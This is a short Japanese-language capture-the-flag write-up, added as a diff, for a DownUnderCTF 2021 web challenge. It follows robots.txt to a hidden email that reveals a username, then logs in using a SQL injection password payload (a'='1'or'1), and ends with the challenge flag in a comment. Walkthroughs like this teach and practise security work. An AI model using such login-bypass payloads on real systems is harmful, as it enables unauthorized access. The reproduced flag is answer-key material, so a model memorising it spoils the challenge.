@@ -1,0 +1,54 @@
+# Writeup
+
+[https://web-cowboy-world-54f063db.chal-2021.duc.tf](https://web-cowboy-world-54f063db.chal-2021.duc.tf/)にアクセスする。
+
+![](img/2021-09-26-14-57-23.png)
+
+次に、[https://web-cowboy-world-54f063db.chal-2021.duc.tf/robots.txt](https://web-cowboy-world-54f063db.chal-2021.duc.tf/robots.txt)にアクセスすると
+
+```
+# pls no look
+
+User-Agent: regular_cowboys
+Disallow: /sad.eml
+```
+
+`/sad.eml`というファイルがあることが分かる。
+
+```
+MIME-Version: 1.0
+Date: Sun, 18 Jul 2021 20:48:32 +1000
+Message-ID: <CAOXXCfPcb9Odey1va2xW=paWmwgrQoYFu9ayBUznwLr-FuD9Gw@mail.gmail.com>
+Subject: :'( 
+From: DownUnder CTF <contact.downunderctf@gmail.com>
+To: sadcowboys@everyone.com
+Content-Type: multipart/alternative; boundary="0000000000000f998405c7639019"
+
+--0000000000000f998405c7639019
+Content-Type: text/plain; charset="UTF-8"
+
+Everyone says 'yeee hawwwww'
+
+but never 'hawwwww yeee'
+
+:'(
+
+thats why a 'sadcowboy' is only allowed to go into our website
+
+--0000000000000f998405c7639019
+Content-Type: text/html; charset="UTF-8"
+
+<div dir="ltr">Everyone says &#39;yeee hawwwww&#39;<br><br>but never &#39;hawwwww yeee&#39;<br><br>:&#39;(<br><br>thats why a &#39;sadcowboy&#39; is only allowed to go into our website<br></div>
+
+--0000000000000f998405c7639019--
+```
+
+`username`が`sadcowboy`であることが書いてあるので、SQLインジェクションでログインするとフラグが得られた。
+
+```
+Username : sadcowboy
+
+Password : a'='1'or'1
+```
+
+<!-- DUCTF{haww_yeeee_downunderctf?} -->
